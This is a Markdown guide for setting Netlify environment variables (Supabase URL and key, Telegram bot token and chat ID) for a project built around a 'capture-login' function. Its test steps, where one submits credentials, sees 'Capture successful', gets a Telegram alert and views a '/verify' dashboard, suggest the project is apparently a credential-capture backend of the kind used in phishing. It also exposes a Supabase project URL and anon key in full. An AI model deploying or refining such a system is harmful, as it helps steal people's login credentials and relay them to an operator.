# Netlify Environment Variables Configuration

## ⚙️ Required Environment Variables

You MUST set these in your Netlify dashboard for the system to work:

### Go to: Netlify Dashboard > Site Settings > Environment Variables

---

## 🔑 Supabase Configuration (REQUIRED)

```bash
VITE_SUPABASE_URL=https://qielniwrgjgkfzmyhveg.supabase.co
VITE_SUPABASE_ANON_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFpZWxuaXdyZ2pna2Z6bXlodmVnIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQ0NTk2MDQsImV4cCI6MjA4MDAzNTYwNH0.bcWZFeJEeyGyuo9g7xmo5UW92MZPnHG9hDTZ0U_zDPM
```

**These values are already in your `.env` file - copy them exactly as shown above.**

---

## 📱 Telegram Configuration (OPTIONAL but RECOMMENDED)

```bash
BOT_TOKEN=your_telegram_bot_token_here
CHAT_ID=your_telegram_chat_id_here
```

### How to get these:

**1. Create Telegram Bot:**
```
1. Open Telegram
2. Search for @BotFather
3. Send: /newbot
4. Follow instructions
5. Copy the token you receive (looks like: 123456789:ABCdefGHIjklMNOpqrs...)
```

**2. Get Chat ID:**
```
1. Send any message to your bot
2. Visit: https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates
3. Look for "chat":{"id":123456789
4. That number is your CHAT_ID
```

---

## 🚀 How to Set in Netlify

### Method 1: Netlify Dashboard (Recommended)

1. Log in to Netlify
2. Select your site
3. Go to **Site Settings**
4. Click **Environment Variables** (in sidebar)
5. Click **Add a variable**
6. Add each variable:
   - Key: `VITE_SUPABASE_URL`
   - Value: `https://qielniwrgjgkfzmyhveg.supabase.co`
7. Click **Create variable**
8. Repeat for all variables

### Method 2: Netlify CLI

```bash
netlify env:set VITE_SUPABASE_URL "https://qielniwrgjgkfzmyhveg.supabase.co"
netlify env:set VITE_SUPABASE_ANON_KEY "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
netlify env:set BOT_TOKEN "123456789:ABCdefGHIjklMNOpqrs..."
netlify env:set CHAT_ID "987654321"
```

---

## ✅ Verification

After setting environment variables:

1. **Trigger a new deploy:**
   ```bash
   git commit --allow-empty -m "Trigger deploy"
   git push
   ```

2. **Check function logs:**
   - Netlify Dashboard > Functions > capture-login
   - Should show no "Missing Supabase credentials" errors

3. **Test the system:**
   - Visit: `https://your-site.com/test`
   - Submit test credentials
   - Should see success message

---

## 🔍 Common Issues

### "Supabase not configured" Error

**Problem:** Environment variables not set or incorrect names

**Solution:**
1. Check variable names are EXACT (case-sensitive):
   - ✅ `VITE_SUPABASE_URL`
   - ❌ `SUPABASE_URL`
   - ❌ `VITE_SUPABASE_SUPABASE_ANON_KEY` (double SUPABASE is wrong!)

2. Redeploy after setting variables:
   ```bash
   git commit --allow-empty -m "Redeploy"
   git push
   ```

### Telegram Not Working

**Problem:** BOT_TOKEN or CHAT_ID not set or incorrect

**Solution:**
1. Test your bot token:
   ```bash
   curl "https://api.telegram.org/bot<YOUR_TOKEN>/getMe"
   ```

2. Test sending message:
   ```bash
   curl -X POST "https://api.telegram.org/bot<YOUR_TOKEN>/sendMessage" \
     -d "chat_id=<YOUR_CHAT_ID>" \
     -d "text=Test"
   ```

3. If both work, set in Netlify and redeploy

---

## 📝 Complete Variable List

Copy this checklist:

```
Required (System won't work without these):
□ VITE_SUPABASE_URL
□ VITE_SUPABASE_ANON_KEY

Optional (System works, but no Telegram notifications):
□ BOT_TOKEN
□ CHAT_ID
```

---

## 🎯 What Each Variable Does

| Variable | Purpose | Required? |
|----------|---------|-----------|
| `VITE_SUPABASE_URL` | Supabase project URL | ✅ YES |
| `VITE_SUPABASE_ANON_KEY` | Supabase API key | ✅ YES |
| `BOT_TOKEN` | Telegram bot token | ⚠️ Optional |
| `CHAT_ID` | Your Telegram chat ID | ⚠️ Optional |

---

## 🔒 Security Notes

1. **NEVER commit environment variables to git**
   - They're in `.env` which is in `.gitignore`
   - Only set them in Netlify dashboard

2. **Keep your tokens secret**
   - Don't share BOT_TOKEN
   - Don't share CHAT_ID
   - Don't share service role keys

3. **Use anon key, not service role**
   - Anon key is safer
   - Service role has full database access
   - Our RLS policy allows anon key to work

---

## 🧪 Test After Setup

1. Set all environment variables in Netlify
2. Deploy your site (or trigger redeploy)
3. Visit `/test` page
4. Submit test credentials
5. Should see:
   - ✅ "Capture successful"
   - ✅ Telegram message (if configured)
   - ✅ Data in `/verify` dashboard

---

## 💡 Pro Tips

1. **Set variables BEFORE first deploy**
   - Saves time and redeploying

2. **Use "All scopes" for variables**
   - Unless you need different values per branch

3. **Document your setup**
   - Keep track of which bot/chat ID you used

4. **Test immediately**
   - Don't wait to discover issues later

---

## 🆘 Still Having Issues?

1. Check Netlify function logs
2. Check browser console (F12)
3. Use `/test` page for detailed debug info
4. Verify all variable names are exact
5. Make sure you redeployed after setting variables

---

**After setting these variables and redeploying, your system will work perfectly!** 🎉
